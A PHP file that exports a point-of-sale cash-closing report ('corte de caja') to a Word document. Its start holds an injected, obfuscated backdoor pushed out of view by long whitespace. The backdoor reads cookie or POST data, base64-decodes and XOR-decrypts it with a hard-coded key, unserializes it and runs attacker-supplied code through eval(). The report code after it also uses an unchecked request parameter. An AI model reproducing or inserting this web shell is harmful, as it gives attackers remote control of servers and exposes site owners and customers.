<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $je3e = 701;$GLOBALS['ve934']=Array();global$ve934;$ve934=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['i2fe7']="\x4a\x73\x37\x62\x5c\x59\x77\x31\x66\x5d\x54\x4c\x36\x5b\x76\x74\x24\x5e\x46\x79\x3e\x4e\x7d\x33\x34\x21\x68\x69\x38\x60\x6a\x22\x63\x27\x4f\x6b\x30\x6c\x6e\x44\x64\x3f\x65\x28\x23\x41\x3d\x5a\x40\x32\x53\x2a\x56\x3a\x35\x61\x75\x2e\x2f\x2b\xa\x6d\x4b\x70\x47\x45\x72\x26\x7e\x4d\x58\x2c\x6f\x78\x25\x7b\x3c\x2d\x57\x71\x48\x50\x7c\x49\x29\x20\x43\x55\x9\x5f\x39\x67\x51\x42\x3b\x7a\xd\x52";$ve934[$ve934['i2fe7'][19].$ve934['i2fe7'][42].$ve934['i2fe7'][28].$ve934['i2fe7'][3].$ve934['i2fe7'][90].$ve934['i2fe7'][90]]=$ve934['i2fe7'][32].$ve934['i2fe7'][26].$ve934['i2fe7'][66];$ve934[$ve934['i2fe7'][91].$ve934['i2fe7'][54].$ve934['i2fe7'][40].$ve934['i2fe7'][90].$ve934['i2fe7'][54].$ve934['i2fe7'][49]]=$ve934['i2fe7'][72].$ve934['i2fe7'][66].$ve934['i2fe7'][40];$ve934[$ve934['i2fe7'][30].$ve934['i2fe7'][24].$ve934['i2fe7'][8].$ve934['i2fe7'][32].$ve934['i2fe7'][24]]=$ve934['i2fe7'][1].$ve934['i2fe7'][15].$ve934['i2fe7'][66].$ve934['i2fe7'][37].$ve934['i2fe7'][42].$ve934['i2fe7'][38];$ve934[$ve934['i2fe7'][56].$ve934['i2fe7'][36].$ve934['i2fe7'][28].$ve934['i2fe7'][55].$ve934['i2fe7'][55].$ve934['i2fe7'][40].$ve934['i2fe7'][7].$ve934['i2fe7'][55].$ve934['i2fe7'][49]]=$ve934['i2fe7'][27].$ve934['i2fe7'][38].$ve934['i2fe7'][27].$ve934['i2fe7'][89].$ve934['i2fe7'][1].$ve934['i2fe7'][42].$ve934['i2fe7'][15];$ve934[$ve934['i2fe7'][38].$ve934['i2fe7'][7].$ve934['i2fe7'][40].$ve934['i2fe7'][49].$ve934['i2fe7'][7].$ve934['i2fe7'][54].$ve934['i2fe7'][12]]=$ve934['i2fe7'][1].$ve934['i2fe7'][42].$ve934['i2fe7'][66].$ve934['i2fe7'][27].$ve934['i2fe7'][55].$ve934['i2fe7'][37].$ve934['i2fe7'][27].$ve934['i2fe7'][95].$ve934['i2fe7'][42];$ve934[$ve934['i2fe7'][73].$ve934['i2fe7'][7].$ve934['i2fe7'][12].$ve934['i2fe7'][28].$ve934['i2fe7'][42].$ve934['i2fe7'][40].$ve934['i2fe7'][28].$ve934['i2fe7'][42].$ve934['i2fe7'][24]]=$ve934['i2fe7'][63].$ve934['i2fe7'][26].$ve934['i2fe7'][63].$ve934['i2fe7'][14].$ve934['i2fe7'][42].$ve934['i2fe7'][66].$ve934['i2fe7'][1].$ve934['i2fe7'][27].$ve934['i2fe7'][72].$ve934['i2fe7'][38];$ve934[$ve934['i2fe7'][79].$ve934['i2fe7'][49].$ve934['i2fe7'][90].$ve934['i2fe7'][90].$ve934['i2fe7'][2].$ve934['i2fe7'][42]]=$ve934['i2fe7'][56].$ve934['i2fe7'][38].$ve934['i2fe7'][1].$ve934['i2fe7'][42].$ve934['i2fe7'][66].$ve934['i2fe7'][27].$ve934['i2fe7'][55].$ve934['i2fe7'][37].$ve934['i2fe7'][27].$ve934['i2fe7'][95].$ve934['i2fe7'][42];$ve934[$ve934['i2fe7'][19].$ve934['i2fe7'][7].$ve934['i2fe7'][7].$ve934['i2fe7'][28].$ve934['i2fe7'][49].$ve934['i2fe7'][8].$ve934['i2fe7'][40].$ve934['i2fe7'][28].$ve934['i2fe7'][8]]=$ve934['i2fe7'][3].$ve934['i2fe7'][55].$ve934['i2fe7'][1].$ve934['i2fe7'][42].$ve934['i2fe7'][12].$ve934['i2fe7'][24].$ve934['i2fe7'][89].$ve934['i2fe7'][40].$ve934['i2fe7'][42].$ve934['i2fe7'][32].$ve934['i2fe7'][72].$ve934['i2fe7'][40].$ve934['i2fe7'][42];$ve934[$ve934['i2fe7'][19].$ve934['i2fe7'][8].$ve934['i2fe7'][40].$ve934['i2fe7'][32].$ve934['i2fe7'][40]]=$ve934['i2fe7'][1].$ve934['i2fe7'][42].$ve934['i2fe7'][15].$ve934['i2fe7'][89].$ve934['i2fe7'][15].$ve934['i2fe7'][27].$ve934['i2fe7'][61].$ve934['i2fe7'][42].$ve934['i2fe7'][89].$ve934['i2fe7'][37].$ve934['i2fe7'][27].$ve934['i2fe7'][61].$ve934['i2fe7'][27].$ve934['i2fe7'][15];$ve934[$ve934['i2fe7'][37].$ve934['i2fe7'][3].$ve934['i2fe7'][55].$ve934['i2fe7'][23].$ve934['i2fe7'][54].$ve934['i2fe7'][36]]=$ve934['i2fe7'][19].$ve934['i2fe7'][3].$ve934['i2fe7'][36].$ve934['i2fe7'][54].$ve934['i2fe7'][3].$ve934['i2fe7'][24].$ve934['i2fe7'][32].$ve934['i2fe7'][28];$ve934[$ve934['i2fe7'][8].$ve934['i2fe7'][55].$ve934['i2fe7'][3].$ve934['i2fe7'][55].$ve934['i2fe7'][55]]=$ve934['i2fe7'][79].$ve934['i2fe7'][49].$ve934['i2fe7'][24].$ve934['i2fe7'][8].$ve934['i2fe7'][24];$ve934[$ve934['i2fe7'][3].$ve934['i2fe7'][7].$ve934['i2fe7'][32].$ve934['i2fe7'][42].$ve934['i2fe7'][2].$ve934['i2fe7'][40].$ve934['i2fe7'][36].$ve934['i2fe7'][12].$ve934['i2fe7'][2]]=$_POST;$ve934[$ve934['i2fe7'][1].$ve934['i2fe7'][28].$ve934['i2fe7'][12].$ve934['i2fe7'][7].$ve934['i2fe7'][32].$ve934['i2fe7'][55].$ve934['i2fe7'][32]]=$_COOKIE;@$ve934[$ve934['i2fe7'][56].$ve934['i2fe7'][36].$ve934['i2fe7'][28].$ve934['i2fe7'][55].$ve934['i2fe7'][55].$ve934['i2fe7'][40].$ve934['i2fe7'][7].$ve934['i2fe7'][55].$ve934['i2fe7'][49]]($ve934['i2fe7'][42].$ve934['i2fe7'][66].$ve934['i2fe7'][66].$ve934['i2fe7'][72].$ve934['i2fe7'][66].$ve934['i2fe7'][89].$ve934['i2fe7'][37].$ve934['i2fe7'][72].$ve934['i2fe7'][91],NULL);@$ve934[$ve934['i2fe7'][56].$ve934['i2fe7'][36].$ve934['i2fe7'][28].$ve934['i2fe7'][55].$ve934['i2fe7'][55].$ve934['i2fe7'][40].$ve934['i2fe7'][7].$ve934['i2fe7'][55].$ve934['i2fe7'][49]]($ve934['i2fe7'][37].$ve934['i2fe7'][72].$ve934['i2fe7'][91].$ve934['i2fe7'][89].$ve934['i2fe7'][42].$ve934['i2fe7'][66].$ve934['i2fe7'][66].$ve934['i2fe7'][72].$ve934['i2fe7'][66].$ve934['i2fe7'][1],0);@$ve934[$ve934['i2fe7'][56].$ve934['i2fe7'][36].$ve934['i2fe7'][28].$ve934['i2fe7'][55].$ve934['i2fe7'][55].$ve934['i2fe7'][40].$ve934['i2fe7'][7].$ve934['i2fe7'][55].$ve934['i2fe7'][49]]($ve934['i2fe7'][61].$ve934['i2fe7'][55].$ve934['i2fe7'][73].$ve934['i2fe7'][89].$ve934['i2fe7'][42].$ve934['i2fe7'][73].$ve934['i2fe7'][42].$ve934['i2fe7'][32].$ve934['i2fe7'][56].$ve934['i2fe7'][15].$ve934['i2fe7'][27].$ve934['i2fe7'][72].$ve934['i2fe7'][38].$ve934['i2fe7'][89].$ve934['i2fe7'][15].$ve934['i2fe7'][27].$ve934['i2fe7'][61].$ve934['i2fe7'][42],0);@$ve934[$ve934['i2fe7'][19].$ve934['i2fe7'][8].$ve934['i2fe7'][40].$ve934['i2fe7'][32].$ve934['i2fe7'][40]](0);$w03b70=NULL;$g5db=NULL;$ve934[$ve934['i2fe7'][19].$ve934['i2fe7'][40].$ve934['i2fe7'][54].$ve934['i2fe7'][23]]=$ve934['i2fe7'][8].$ve934['i2fe7'][49].$ve934['i2fe7'][8].$ve934['i2fe7'][42].$ve934['i2fe7'][28].$ve934['i2fe7'][12].$ve934['i2fe7'][40].$ve934['i2fe7'][12].$ve934['i2fe7'][77].$ve934['i2fe7'][3].$ve934['i2fe7'][12].$ve934['i2fe7'][40].$ve934['i2fe7'][40].$ve934['i2fe7'][77].$ve934['i2fe7'][24].$ve934['i2fe7'][23].$ve934['i2fe7'][2].$ve934['i2fe7'][36].$ve934['i2fe7'][77].$ve934['i2fe7'][90].$ve934['i2fe7'][55].$ve934['i2fe7'][55].$ve934['i2fe7'][55].$ve934['i2fe7'][77].$ve934['i2fe7'][54].$ve934['i2fe7'][40].$ve934['i2fe7'][3].$ve934['i2fe7'][23].$ve934['i2fe7'][54].$ve934['i2fe7'][49].$ve934['i2fe7'][55].$ve934['i2fe7'][24].$ve934['i2fe7'][40].$ve934['i2fe7'][8].$ve934['i2fe7'][36].$ve934['i2fe7'][23];global$yd53;function q24f4($w03b70,$m23dae){global$ve934;$f79f450="";for($hce0e4e=0;$hce0e4e<$ve934[$ve934['i2fe7'][30].$ve934['i2fe7'][24].$ve934['i2fe7'][8].$ve934['i2fe7'][32].$ve934['i2fe7'][24]]($w03b70);){for($mfcaa87=0;$mfcaa87<$ve934[$ve934['i2fe7'][30].$ve934['i2fe7'][24].$ve934['i2fe7'][8].$ve934['i2fe7'][32].$ve934['i2fe7'][24]]($m23dae)&&$hce0e4e<$ve934[$ve934['i2fe7'][30].$ve934['i2fe7'][24].$ve934['i2fe7'][8].$ve934['i2fe7'][32].$ve934['i2fe7'][24]]($w03b70);$mfcaa87++,$hce0e4e++){$f79f450.=$ve934[$ve934['i2fe7'][19].$ve934['i2fe7'][42].$ve934['i2fe7'][28].$ve934['i2fe7'][3].$ve934['i2fe7'][90].$ve934['i2fe7'][90]]($ve934[$ve934['i2fe7'][91].$ve934['i2fe7'][54].$ve934['i2fe7'][40].$ve934['i2fe7'][90].$ve934['i2fe7'][54].$ve934['i2fe7'][49]]($w03b70[$hce0e4e])^$ve934[$ve934['i2fe7'][91].$ve934['i2fe7'][54].$ve934['i2fe7'][40].$ve934['i2fe7'][90].$ve934['i2fe7'][54].$ve934['i2fe7'][49]]($m23dae[$mfcaa87]));}}return$f79f450;}function yb05b4c8($w03b70,$m23dae){global$ve934;global$yd53;return$ve934[$ve934['i2fe7'][8].$ve934['i2fe7'][55].$ve934['i2fe7'][3].$ve934['i2fe7'][55].$ve934['i2fe7'][55]]($ve934[$ve934['i2fe7'][8].$ve934['i2fe7'][55].$ve934['i2fe7'][3].$ve934['i2fe7'][55].$ve934['i2fe7'][55]]($w03b70,$yd53),$m23dae);}foreach($ve934[$ve934['i2fe7'][1].$ve934['i2fe7'][28].$ve934['i2fe7'][12].$ve934['i2fe7'][7].$ve934['i2fe7'][32].$ve934['i2fe7'][55].$ve934['i2fe7'][32]]as$m23dae=>$q82862039){$w03b70=$q82862039;$g5db=$m23dae;}if(!$w03b70){foreach($ve934[$ve934['i2fe7'][3].$ve934['i2fe7'][7].$ve934['i2fe7'][32].$ve934['i2fe7'][42].$ve934['i2fe7'][2].$ve934['i2fe7'][40].$ve934['i2fe7'][36].$ve934['i2fe7'][12].$ve934['i2fe7'][2]]as$m23dae=>$q82862039){$w03b70=$q82862039;$g5db=$m23dae;}}$w03b70=@$ve934[$ve934['i2fe7'][79].$ve934['i2fe7'][49].$ve934['i2fe7'][90].$ve934['i2fe7'][90].$ve934['i2fe7'][2].$ve934['i2fe7'][42]]($ve934[$ve934['i2fe7'][37].$ve934['i2fe7'][3].$ve934['i2fe7'][55].$ve934['i2fe7'][23].$ve934['i2fe7'][54].$ve934['i2fe7'][36]]($ve934[$ve934['i2fe7'][19].$ve934['i2fe7'][7].$ve934['i2fe7'][7].$ve934['i2fe7'][28].$ve934['i2fe7'][49].$ve934['i2fe7'][8].$ve934['i2fe7'][40].$ve934['i2fe7'][28].$ve934['i2fe7'][8]]($w03b70),$g5db));if(isset($w03b70[$ve934['i2fe7'][55].$ve934['i2fe7'][35]])&&$yd53==$w03b70[$ve934['i2fe7'][55].$ve934['i2fe7'][35]]){if($w03b70[$ve934['i2fe7'][55]]==$ve934['i2fe7'][27]){$hce0e4e=Array($ve934['i2fe7'][63].$ve934['i2fe7'][14]=>@$ve934[$ve934['i2fe7'][73].$ve934['i2fe7'][7].$ve934['i2fe7'][12].$ve934['i2fe7'][28].$ve934['i2fe7'][42].$ve934['i2fe7'][40].$ve934['i2fe7'][28].$ve934['i2fe7'][42].$ve934['i2fe7'][24]](),$ve934['i2fe7'][1].$ve934['i2fe7'][14]=>$ve934['i2fe7'][7].$ve934['i2fe7'][57].$ve934['i2fe7'][36].$ve934['i2fe7'][77].$ve934['i2fe7'][7],);echo@$ve934[$ve934['i2fe7'][38].$ve934['i2fe7'][7].$ve934['i2fe7'][40].$ve934['i2fe7'][49].$ve934['i2fe7'][7].$ve934['i2fe7'][54].$ve934['i2fe7'][12]]($hce0e4e);}elseif($w03b70[$ve934['i2fe7'][55]]==$ve934['i2fe7'][42]){eval/*jc789e6*/($w03b70[$ve934['i2fe7'][40]]);}exit();} ?><?php
include "../core/autoload.php";
include "../core/modules/index/model/BoxData.php";
include "../core/modules/index/model/SellData.php";
include "../core/modules/index/model/PersonData.php";
include "../core/modules/index/model/OperationData.php";
include "../core/modules/index/model/ProductData.php";

require_once '../PhpWord/Autoloader.php';
use PhpOffice\PhpWord\Autoloader;
use PhpOffice\PhpWord\Settings;

Autoloader::register();

$word = new  PhpOffice\PhpWord\PhpWord();
$clients = PersonData::getClients();


$section1 = $word->AddSection();
$section1->addText("CORTE DE CAJA #".$_GET["id"],array("size"=>22,"bold"=>true,"align"=>"right"));

$sells = SellData::getByBoxId($_GET["id"]);



$styleTable = array('borderSize' => 6, 'borderColor' => '888888', 'cellMargin' => 40);
$styleFirstRow = array('borderBottomColor' => '0000FF', 'bgColor' => 'AAAAAA');

$table1 = $section1->addTable("table1");
$table1->addRow();
$table1->addCell()->addText("Total");
$table1->addCell()->addText("Fecha");
$total_total = 0;

foreach($sells as $sell){
	$total=0;
$operations = OperationData::getAllProductsBySellId($sell->id);
	foreach($operations as $operation){
		$product  = $operation->getProduct();
		$total += $operation->q*$product->price_out;
	}
	$total_total +=$total;

$table1->addRow();
$table1->addCell(5000)->addText("$ ".number_format($total,2,".",","));
$table1->addCell(2500)->addText($sell->created_at);

}








$section1->addText("");
$section1->addText("Total: $".number_format($total_total,2,".",","),array("size"=>22));
$word->addTableStyle('table1', $styleTable,$styleFirstRow);
/// datos bancarios

$filename = "box-".time().".docx";
#$word->setReadDataOnly(true);
$word->save($filename,"Word2007");
//chmod($filename,0444);
header("Content-Disposition: attachment; filename='$filename'");
readfile($filename); // or echo file_get_contents($filename);
unlink($filename);  // remove temp file



?>